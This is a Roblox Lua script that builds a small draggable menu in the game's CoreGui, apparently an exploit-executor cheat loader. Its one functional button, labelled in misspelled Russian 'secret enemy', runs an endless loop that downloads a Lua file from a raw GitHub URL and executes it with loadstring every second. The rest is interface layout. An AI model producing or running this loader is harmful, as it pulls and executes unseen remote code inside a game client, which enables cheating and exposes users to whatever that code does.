
local GameScriptGui = Instance.new("ScreenGui")
local MainFrame = Instance.new("Frame")
local Tittle = Instance.new("Frame")
local Decoration = Instance.new("Frame")
local Credits = Instance.new("TextLabel")
local Secrt = Instance.new("TextButton")
local xButton = Instance.new("TextButton")
local OpenFrame = Instance.new("Frame")
local Open = Instance.new("TextButton")


GameScriptGui.Name = "GameScriptGui"
GameScriptGui.Parent = game.CoreGui

MainFrame.Name = "MainFrame"
MainFrame.Parent = GameScriptGui
MainFrame.Active = true
MainFrame.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
MainFrame.BorderSizePixel = 0
MainFrame.Draggable = true
MainFrame.Position = UDim2.new(0.339118838, 0, 0.0474308431, 0)
MainFrame.Size = UDim2.new(0, 564, 0, 304)
MainFrame.Visible = false
Tittle.Name = "Tittle"
Tittle.Parent = MainFrame
Tittle.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
Tittle.BorderSizePixel = 0
Tittle.Size = UDim2.new(0, 564, 0, 36)


Secrt.Name = "Secrt"
Secrt.Parent = MainFrame
Secrt.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
Secrt.BorderSizePixel = 0
Secrt.Position = UDim2.new(0.0283687934, 0, 0.417763174, 0)
Secrt.Size = UDim2.new(0, 229, 0, 50)
Secrt.Font = Enum.Font.SciFi
Secrt.Text = "Сикретный враг"
Secrt.TextColor3 = Color3.new(0.333333, 1, 1)
Secrt.TextSize = 14


xButton.Name = "xButton"
xButton.Parent = MainFrame
xButton.BackgroundColor3 = Color3.new(0.0588235, 0.0588235, 0.0588235)
xButton.BorderSizePixel = 0
xButton.Size = UDim2.new(0, 31, 0, 36)
xButton.Font = Enum.Font.SourceSans
xButton.Text = "X"
xButton.TextColor3 = Color3.new(0.333333, 1, 1)
xButton.TextSize = 20

OpenFrame.Name = "OpenFrame"
OpenFrame.Parent = GameScriptGui
OpenFrame.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
OpenFrame.BorderSizePixel = 0
OpenFrame.Position = UDim2.new(0, 0, 0.707509875, 0)
OpenFrame.Size = UDim2.new(0, 160, 0, 40)

Open.Name = "Open"
Open.Parent = OpenFrame
Open.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
Open.BorderSizePixel = 0
Open.Position = UDim2.new(0, 0, 0.075000003, 0)
Open.Size = UDim2.new(0, 158, 0, 37)
Open.Font = Enum.Font.SciFi
Open.Text = "Open"
Open.TextColor3 = Color3.new(0.333333, 1, 1)
Open.TextSize = 14


Secrt.MouseButton1Down:connect(function()
while true do
loadstring(game:HttpGet(('https://raw.githubusercontent.com/Player-Frisk/Test/4107c271eb13ddb1a2fbbef8f754d249ce6dc2dd/Ch.Lua'),true))()
wait(1)
end 
end)


xButton.MouseButton1Down:connect(function()
MainFrame:TweenPosition(UDim2.new(0.384,0,-1,0), 'Out', 'Elastic', 3)
MainFrame.Visible = false
end)

Open.MouseButton1Down:connect(function()
OpenFrame.Visible = false
MainFrame.Visible = true
MainFrame:TweenPosition(UDim2.new(0.384,0,0.377,0), 'Out', 'Elastic', 3)
end)